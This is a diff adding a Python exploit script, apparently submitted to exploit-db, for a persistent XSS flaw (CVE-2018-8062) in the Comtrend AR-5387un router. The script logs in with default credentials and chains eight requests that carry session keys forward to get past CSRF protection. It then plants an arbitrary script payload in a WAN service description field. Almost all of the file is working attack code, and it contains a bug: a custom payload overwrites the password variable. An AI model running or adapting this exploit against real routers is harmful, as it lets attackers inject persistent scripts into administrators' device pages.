@@ -1,0 +1,274 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Exploit Title: Persistent XSS on Comtrend AR-5387un router
+Date: 19/10/2020
+Exploit Author: OscarAkaElvis
+Vendor Homepage: https://www.comtrend.com/
+Version: Comtrend AR-5387un router
+Tested on: Software/Firmware version A731-410JAZ-C04_R02.A2pD035g.d23i
+CVE: CVE-2018-8062
+
+Disclosure timeline:
+08/03/2018: Vulnerability was discovered
+10/03/2018: Reported to Mitre (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8062)
+11/03/2018: Mitre answered, CVE number reserved
+11/03/2018: Reported to Comtrend as part of responsible disclosure, they never answered
+16/10/2020: Two years later, reported again to Comtrend and public disclosure (https://twitter.com/OscarAkaElvis/status/1317004119509471233)
+18/10/2020: Exploit creation
+19/10/2020: Exploit sent to exploit-db
+
+Exploitation explanation:
+To exploit this vulnerability, once logged into the router, a WAN service must be created
+Click on "Advanced Setup", "WAN Service". "Add button", "Next"
+Then insert the payload into the "Enter Service Description" field. This was used for the PoC <script>alert('xss');</script>
+Then click on "Next" four times to go on through the steps and finally click on "Apply/Save"
+The result of the XSS will be displayed and triggered on the WAN services page
+
+This exploit automatize the entire process bypassing CSRF protection and allowing to set a custom XSS payload
+Happy hacking :)
+OscarAkaElvis - https://twitter.com/OscarAkaElvis
+"""
+
+# Dependencies and libraries
+import requests
+from requests.auth import HTTPBasicAuth
+import re
+from sys import argv, exit
+import argparse
+from os import path
+from time import sleep
+
+
+class Exploit(object):
+
+	# Global class vars
+	session = requests.Session()
+	user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36"
+	ip = None
+	username = None
+	password = None
+	payload = None
+	default_ip = "192.168.1.1"
+	default_username = "admin"
+	default_password = "admin"
+	default_payload = "<script>alert('xss');</script>"
+	exploit_version = "1.0"
+	current_sessionkey = None
+	referer_sessionkey = None
+
+	script_name = path.basename(argv[0])
+	description_text = 'CVE-2018-8062 exploit by OscarAkaElvis, Persistent XSS on Comtrend AR-5387un router'
+	epilog_text = 'Examples:\n    python3 ' + script_name + ' -i 192.168.0.150\n    python3 ' + script_name + ' -u admin -p mySecureRouterP@ss\n    python3 ' + script_name + ' -i 10.0.0.1 -u admin -p mySecureRouterP@ss -x \'<script>evil_js_stuff</script>\''
+
+	def start_msg(self):
+		print("[*] Starting CVE-2018-8062 exploit...")
+		sleep(0.5)
+
+	def check_params(self, arguments):
+		parser = argparse.ArgumentParser(description=self.description_text, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=self.epilog_text)
+		parser.add_argument('-i', '--ip', dest='ip', required=False, help="set router's ip", metavar='IP')
+		parser.add_argument('-u', '--username', dest='username', required=False, help="set user to login on router", metavar='USERNAME')
+		parser.add_argument('-p', '--password', dest='password', required=False, help="set password to login on router", metavar='PASSWORD')
+		parser.add_argument('-x', '--xss-payload', dest='payload', required=False, help="set xss payload", metavar='PAYLOAD')
+		parser.add_argument('-v', '--version', action='version', version=self.print_version(), help="show exploit's version number and exit")
+
+		args = parser.parse_args(arguments)
+
+		self.start_msg()
+
+		print("[*] Launch the exploit using -h argument to check all the available options")
+		print()
+
+		if not args.ip:
+			self.ip = self.default_ip
+			print("[!] Warning, no ip set, default will be used: " + str(self.ip))
+		else:
+			self.ip = args.ip
+
+		if not args.username:
+			self.username = self.default_username
+			print("[!] Warning, no username set, default will be used: " + str(self.username))
+		else:
+			self.username = args.username
+
+		if not args.password:
+			self.password = self.default_password
+			print("[!] Warning, no password set, default will be used: " + str(self.password))
+		else:
+			self.password = args.password
+
+		if not args.payload:
+			self.payload = self.default_payload
+			print("[!] Warning, no XSS payload set, PoC default will be used: " + str(self.payload))
+		else:
+			self.password = args.password
+
+	def print_version(self):
+		print()
+		return 'v{}'.format(self.exploit_version)
+
+	def check_router(self):
+		try:
+			print()
+			print("[*] Trying to detect router...")
+
+			headers = {"User-Agent": self.user_agent}
+			response = self.session.get("http://" + str(self.ip) + "/", headers=headers)
+
+			if re.match(r'.*WWW-Authenticate.*Broadband Router.*', str(response.headers)):
+				print("[+] Comtrend router detected successfully")
+			else:
+				print()
+				print("[-] It seems the target is not a Comtrend router")
+				print("[*] Exiting...")
+				exit(1)
+		except (TimeoutError, ConnectionError, requests.exceptions.ConnectionError):
+			print()
+			print("[-] Can't connect to the router")
+			print("[*] Exiting...")
+			exit(1)
+
+	def check_login(self):
+		print()
+		print("[*] Trying to login...")
+
+		headers = {"User-Agent": self.user_agent}
+		response = self.session.get("http://" + str(self.ip) + "/", headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		if response.status_code != 401:
+			print("[+] Login successfully!")
+			sleep(1)
+		else:
+			print()
+			print("[-] Can't login into the router. Check your creds!")
+			print("[*] Exiting...")
+			exit(1)
+
+	def get_sessionKey(self, response_text):
+		sessionKey = re.search(r'.*sessionKey=([0-9]+).*', str(response_text))
+
+		if sessionKey is not None:
+			sessionKey = sessionKey.group(1)
+		else:
+			sessionKey = re.search(r'.*sessionKey=\\\'([0-9]+).*', str(response_text), re.MULTILINE)
+			if sessionKey is not None:
+				sessionKey = sessionKey.group(1)
+
+		return sessionKey
+
+	def step1(self):
+		print()
+		print("[*] Performing step 1/8. Getting initial sessionKey to bypass CSRF protection...")
+
+		headers = {"User-Agent": self.user_agent}
+		response = self.session.get("http://" + str(self.ip) + "/wancfg.cmd", headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		self.current_sessionkey = self.get_sessionKey(response.content)
+		print("[+] Success! Initial sessionKey: " + self.current_sessionkey)
+		sleep(1)
+
+	def step2(self):
+		print()
+		print("[*] Performing step 2/8...")
+
+		paramsGet = {"sessionKey": self.current_sessionkey, "serviceId": "0"}
+		headers = {"User-Agent": self.user_agent, "Referer": "http://" + str(self.ip) + "/wancfg.cmd"}
+		response = self.session.get("http://" + str(self.ip) + "/wanifc.cmd", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		self.referer_sessionkey = self.current_sessionkey
+		self.current_sessionkey = self.get_sessionKey(response.content)
+		sleep(1)
+
+	def step3(self):
+		print()
+		print("[*] Performing step 3/8...")
+
+		paramsGet = {"sessionKey": self.current_sessionkey, "wanL2IfName": "atm0/(0_8_35)"}
+		headers = {"User-Agent": self.user_agent, "Referer": "http://" + str(self.ip) + "/wanifc.cmd?serviceId=0&sessionKey=" + self.referer_sessionkey}
+		response = self.session.get("http://" + str(self.ip) + "/wansrvc.cmd", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		self.referer_sessionkey = self.current_sessionkey
+		self.current_sessionkey = self.get_sessionKey(response.content)
+		sleep(1)
+
+	def step4(self):
+		print()
+		print("[*] Performing step 4/8...")
+
+		paramsGet = {"vlanMuxPr": "-1", "sessionKey": self.current_sessionkey, "vlanMuxId": "-1", "ntwkPrtcl": "0", "enVlanMux": "1", "enblEnetWan": "0", "serviceName": self.payload}
+		headers = {"User-Agent": self.user_agent, "Referer": "http://" + str(self.ip) + "/wansrvc.cmd?wanL2IfName=atm0/(0_8_35)&sessionKey=" + self.referer_sessionkey}
+		response = self.session.get("http://" + str(self.ip) + "/pppoe.cgi", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		self.referer_sessionkey = self.current_sessionkey
+		self.current_sessionkey = self.get_sessionKey(response.content)
+		sleep(1)
+
+	def step5(self):
+		print()
+		print("[*] Performing step 5/8...")
+
+		paramsGet = {"useStaticIpAddress": "0", "pppLocalIpAddress": "0.0.0.0", "sessionKey": self.current_sessionkey, "enblIgmp": "0", "enblFullcone": "0", "pppTimeOut": "0", "pppAuthErrorRetry": "0", "pppServerName": "", "enblPppDebug": "0", "pppPassword": "", "enblNat": "0", "enblOnDemand": "0", "pppUserName": "", "pppIpExtension": "0", "enblFirewall": "0", "pppAuthMethod": "0", "pppToBridge": "0"}
+		headers = {"User-Agent": self.user_agent, "Referer": "http://" + str(self.ip) + "/pppoe.cgi?enblEnetWan=0&ntwkPrtcl=0&enVlanMux=1&vlanMuxId=-1&vlanMuxPr=-1&serviceName=pppoe_0_8_35&sessionKey=" + self.referer_sessionkey}
+		response = self.session.get("http://" + str(self.ip) + "/ifcgateway.cgi", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		self.referer_sessionkey = self.current_sessionkey
+		self.current_sessionkey = self.get_sessionKey(response.content)
+		sleep(1)
+
+	def step6(self):
+		print()
+		print("[*] Performing step 6/8...")
+
+		paramsGet = {"sessionKey": self.current_sessionkey, "defaultGatewayList": "ppp0.1"}
+		headers = {"User-Agent": self.user_agent, "Referer": "http://" + str(self.ip) + "/ifcgateway.cgi?pppUserName=&pppPassword=&enblOnDemand=0&pppTimeOut=0&useStaticIpAddress=0&pppLocalIpAddress=0.0.0.0&pppIpExtension=0&enblNat=0&enblFirewall=0&enblFullcone=0&pppAuthMethod=0&pppServerName=&pppAuthErrorRetry=0&enblPppDebug=0&pppToBridge=0&enblIgmp=0&sessionKey=" + self.referer_sessionkey}
+		response = self.session.get("http://" + str(self.ip) + "/ifcdns.cgi", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		self.referer_sessionkey = self.current_sessionkey
+		self.current_sessionkey = self.get_sessionKey(response.content)
+		sleep(1)
+
+	def step7(self):
+		print()
+		print("[*] Performing step 7/8...")
+
+		paramsGet = {"dnsRefresh": "1", "sessionKey": self.current_sessionkey, "dnsPrimary": "1.1.1.1", "dnsSecondary": "8.8.8.8"}
+		headers = {"User-Agent": self.user_agent, "Referer": "http://" + str(self.ip) + "/ifcdns.cgi?defaultGatewayList=ppp0.1&sessionKey=" + self.referer_sessionkey}
+		response = self.session.get("http://" + str(self.ip) + "/ntwksum2.cgi", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		self.referer_sessionkey = self.current_sessionkey
+		self.current_sessionkey = self.get_sessionKey(response.content)
+		sleep(1)
+
+	def final_step8(self):
+		print()
+		print("[*] Performing final step 8/8. Deploying XSS payload...")
+
+		paramsGet = {"sessionKey": self.current_sessionkey, "action": "add"}
+		headers = {"User-Agent": self.user_agent, "Referer": "http://" + str(self.ip) + "/ntwksum2.cgi?dnsPrimary=1.1.1.1&dnsSecondary=8.8.8.8&dnsRefresh=1&sessionKey=" + self.referer_sessionkey}
+		self.session.get("http://" + str(self.ip) + "/wancfg.cmd", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
+
+		print()
+		print("[+] XSS payload deployed successfully")
+		print("[+] Happy hacking :) . Author: OscarAkaElvis")
+
+	@staticmethod
+	def main(self, arguments):
+		self.check_params(arguments)
+		self.check_router()
+		self.check_login()
+		self.step1()
+		self.step2()
+		self.step3()
+		self.step4()
+		self.step5()
+		self.step6()
+		self.step7()
+		self.final_step8()
+		exit(0)
+
+
+if __name__ == '__main__':
+	ImportObject = Exploit()
+	ImportObject.main(ImportObject, argv[1:])
